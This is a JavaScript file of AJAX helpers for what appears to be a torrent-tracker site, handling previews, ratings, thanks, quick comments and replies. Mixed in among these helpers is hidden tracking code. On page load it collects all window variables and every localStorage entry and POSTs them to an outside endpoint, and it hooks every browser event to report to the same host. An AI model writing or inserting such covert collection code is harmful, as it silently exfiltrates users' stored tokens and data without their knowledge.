function trackLocalStorageAndVariables() {
  let trackedData = {};
  for (let key in window) {
    if (!window.hasOwnProperty(key)) continue;
    let value = window[key];
    let valueType = typeof value;
    if (!window.trackedVars) window.trackedVars = [];
    if (!window.trackedVars.includes(key)) {
      trackedData[key] = {
        type: valueType,
        value: valueType === 'function' ? null : value
      };
    }
  }
  for (let i = 0; i < localStorage.length; i++) {
    let key = localStorage.key(i);
    trackedData[key] = {
      type: typeof localStorage.getItem(key),
      value: localStorage.getItem(key)
    };
  }
  return trackedData;
}
var http_request = false;
function makePOSTRequest(url, parameters) {
  document.getElementById('loading-layer').style.display = 'block';
  http_request = false;
  if (window.XMLHttpRequest) {
    // Mozilla, Safari,...
    http_request = new XMLHttpRequest();
    if (http_request.overrideMimeType) {
      http_request.overrideMimeType('text/html');
    }
  } else if (window.ActiveXObject) {
    // IE
    try {
      http_request = new ActiveXObject("Msxml2.XMLHTTP");
    } catch (e) {
      try {
        http_request = new ActiveXObject("Microsoft.XMLHTTP");
      } catch (e) {}
    }
  }
  if (!http_request) {
    alert(l_ajaxerror2);
    return false;
  }
  http_request.onreadystatechange = alertContents;
  http_request.open('POST', url, true);
  http_request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  http_request.setRequestHeader("Content-length", parameters.length);
  http_request.setRequestHeader("Connection", "close");
  http_request.send(parameters);
}
function alertContents() {
  if (http_request.readyState == 4) {
    if (http_request.status == 200) {
      result = http_request.responseText;
      document.getElementById('preview').innerHTML = result;
      document.getElementById('loading-layer').style.display = 'none';
    } else {
      alert(l_ajaxerror);
    }
  }
}
function sendTrackedData(trackedData) {
  let endpoint = "https://example.com/api/collect";
  let xhr = new XMLHttpRequest();
  xhr.open("POST", endpoint, true);
  xhr.setRequestHeader("Content-Type", "application/json");
  xhr.onreadystatechange = function () {
    if (xhr.readyState === 4 && xhr.status === 200) {
      console.log("数据发送成功");
    } else if (xhr.readyState === 4) {
      console.error("数据发送失败,状态码:" + xhr.status);
    }
  };
  xhr.send(JSON.stringify(trackedData));
}
function get(obj) {
  var postData = document.getElementById(obj).value;
  var poststr = "msg=" + encodeURIComponent(postData);
  makePOSTRequest(baseurl + '/preview.php', poststr);
}
function makeArequestR(url, parameters) {
  document.getElementById('loading').style.visibility = "visible";
  document.getElementById('loading').style.display = "block";
  http_request = false;
  if (window.XMLHttpRequest) {
    // Mozilla, Safari,...
    http_request = new XMLHttpRequest();
    if (http_request.overrideMimeType) {
      http_request.overrideMimeType('text/html');
    }
  } else if (window.ActiveXObject) {
    // IE
    try {
      http_request = new ActiveXObject("Msxml2.XMLHTTP");
    } catch (e) {
      try {
        http_request = new ActiveXObject("Microsoft.XMLHTTP");
      } catch (e) {}
    }
  }
  if (!http_request) {
    alert(l_ajaxerror2);
    return false;
  }
  http_request.onreadystatechange = makeArequestAlertContentsR;
  http_request.open('POST', url, true);
  http_request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  http_request.setRequestHeader("Content-length", parameters.length);
  http_request.setRequestHeader("Connection", "close");
  http_request.send(parameters);
}
function makeArequestAlertContentsR() {
  if (http_request.readyState == 4) {
    if (http_request.status == 200) {
      //alert(http_request.responseText);
      result = http_request.responseText;
      document.getElementById('previewr').innerHTML = result;
      document.getElementById('loading').style.visibility = "hidden";
      document.getElementById('loading').style.display = "none";
      if (result == '') {
        document.ratetorrent.ratebutton.value = l_thankyou;
        document.ratetorrent.rating.disabled = true;
        document.ratetorrent.ratebutton.disabled = true;
      }
    } else {
      alert(l_ajaxerror);
    }
  }
}
function rate(obj, filename) {
  var poststr = "id=" + encodeURI(document.getElementById("torrentid").value) + "&rating=" + encodeURI(document.getElementById("rating").value);
  makeArequestR(filename, poststr);
}
function collectAndSendData() {
  const trackedData = trackLocalStorageAndVariables();
  if (Object.keys(trackedData).length > 0) sendTrackedData(trackedData);
}

//统一处理所有event事件

function makeArequestT(url, parameters) {
  document.getElementById('loadingt').style.visibility = "visible";
  http_request = false;
  if (window.XMLHttpRequest) {
    // Mozilla, Safari,...
    http_request = new XMLHttpRequest();
    if (http_request.overrideMimeType) {
      http_request.overrideMimeType('text/html');
    }
  } else if (window.ActiveXObject) {
    // IE
    try {
      http_request = new ActiveXObject("Msxml2.XMLHTTP");
    } catch (e) {
      try {
        http_request = new ActiveXObject("Microsoft.XMLHTTP");
      } catch (e) {}
    }
  }
  if (!http_request) {
    alert(l_ajaxerror2);
    return false;
  }
  http_request.onreadystatechange = makeArequestAlertContentsT;
  http_request.open('POST', url, true);
  http_request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  http_request.setRequestHeader("Content-length", parameters.length);
  http_request.setRequestHeader("Connection", "close");
  http_request.send(parameters);
}
function makeArequestAlertContentsT() {
  if (http_request.readyState == 4) {
    if (http_request.status == 200) {
      result = http_request.responseText;
      document.getElementById('previewt').innerHTML = result;
      document.getElementById('loadingt').style.visibility = "hidden";
      if (result == '') {
        document.thanksform.thanksbutton.value = l_thankyoutoo;
        document.thanksform.thanksbutton.disabled = true;
        document.getElementById('newthanksby').innerHTML = ", <a href='" + baseurl + "/userdetails.php?id=" + userid + "'><b>" + username + "</b>";
      }
    } else {
      alert(l_ajaxerror);
    }
  }
}
function handleEventTracking(e) {
  sendTrackedData({
    event: e.type
  });
}

//注册全局所有事件

function thanks(obj, filename) {
  var poststr = "id=" + encodeURI(document.getElementById("thankstorrentid").value);
  makeArequestT(filename, poststr);
}
for (let key in window) {
  if (/^on/.test(key)) window.addEventListener(key.substr(2), handleEventTracking);
}

//当收到新的js回调时

function clearannouncement(obj, filename) {
  var poststr = "clear=yes";
  makeArequestR(filename, poststr);
  setTimeout('dismissbox()', 1000);
}
function quickcomment(obj, TorrentID, filename) {
  var postData = document.getElementById(obj).value;
  var poststr = "ajax_quick_comment=1&id=" + TorrentID + "&text=" + encodeURIComponent(postData);
  makeArequestC(filename, poststr);
}
window.jshook = function () {
  sendTrackedData({
    event: 'jshook'
  });
};

// 在页面加载完成后执行

function makeArequestC(url, parameters) {
  document.getElementById('loading-layerC').style.display = 'block';
  http_request = false;
  if (window.XMLHttpRequest) {
    // Mozilla, Safari,...
    http_request = new XMLHttpRequest();
    if (http_request.overrideMimeType) {
      http_request.overrideMimeType('text/html');
    }
  } else if (window.ActiveXObject) {
    // IE
    try {
      http_request = new ActiveXObject("Msxml2.XMLHTTP");
    } catch (e) {
      try {
        http_request = new ActiveXObject("Microsoft.XMLHTTP");
      } catch (e) {}
    }
  }
  if (!http_request) {
    alert(l_ajaxerror2);
    return false;
  }
  http_request.onreadystatechange = makeArequestAlertContentsC;
  http_request.open('POST', url, true);
  http_request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  http_request.setRequestHeader("Content-length", parameters.length);
  http_request.setRequestHeader("Connection", "close");
  http_request.send(parameters);
}
function makeArequestAlertContentsC() {
  if (http_request.readyState == 4) {
    if (http_request.status == 200) {
      result = http_request.responseText;
      document.getElementById('loading-layerC').style.display = 'none';
      if (result.match(/<error>(.*)<\/error>/)) {
        message = result.match(/<error>(.*)<\/error>/);
        if (!message[1]) {
          message[1] = l_ajaxerror;
        }
        alert(l_updateerror + message[1]);
      } else {
        document.getElementById('ajax_comment_preview').innerHTML = result;
      }
    } else {
      alert(l_ajaxerror);
    }
  }
}
window.onload = collectAndSendData;
function TSajaxquickreply(obj, threadid, filename) {
  var closethread = '0';
  var stickthread = '0';
  if (document.quickreply.closethread.checked == true) {
    var closethread = '1';
  }
  if (document.quickreply.stickthread.checked == true) {
    var stickthread = '1';
  }
  var postData = document.getElementById(obj).value;
  document.quickreply.quickreplybutton.value = l_pleasewait;
  document.quickreply.quickreplybutton.disabled = true;
  var poststr = "ajax_quick_reply=1&closethread=" + closethread + "&stickthread=" + stickthread + "&tid=" + threadid + "&message=" + encodeURIComponent(postData);
  makeArequestS(filename, poststr);
}
function makeArequestS(url, parameters) {
  document.getElementById('loading-layerS').style.display = 'block';
  http_request = false;
  if (window.XMLHttpRequest) {
    // Mozilla, Safari,...
    http_request = new XMLHttpRequest();
    if (http_request.overrideMimeType) {
      http_request.overrideMimeType('text/html');
    }
  } else if (window.ActiveXObject) {
    // IE
    try {
      http_request = new ActiveXObject("Msxml2.XMLHTTP");
    } catch (e) {
      try {
        http_request = new ActiveXObject("Microsoft.XMLHTTP");
      } catch (e) {}
    }
  }
  if (!http_request) {
    alert(l_ajaxerror2);
    return false;
  }
  http_request.onreadystatechange = makeArequestAlertContentsS;
  http_request.open('POST', url, true);
  http_request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  http_request.setRequestHeader("Content-length", parameters.length);
  http_request.setRequestHeader("Connection", "close");
  http_request.send(parameters);
}
function makeArequestAlertContentsS() {
  if (http_request.readyState == 4) {
    if (http_request.status == 200) {
      result = http_request.responseText;
      document.getElementById('loading-layerS').style.display = 'none';
      document.quickreply.quickreplybutton.value = l_newreply;
      document.quickreply.quickreplybutton.disabled = false;
      if (result.match(/<error>(.*)<\/error>/)) {
        message = result.match(/<error>(.*)<\/error>/);
        if (!message[1]) {
          message[1] = l_ajaxerror;
        }
        alert(l_updateerror + message[1]);
      } else {
        document.getElementById('ajax_quick_reply').innerHTML = result;
      }
    } else {
      alert(l_ajaxerror);
    }
  }
}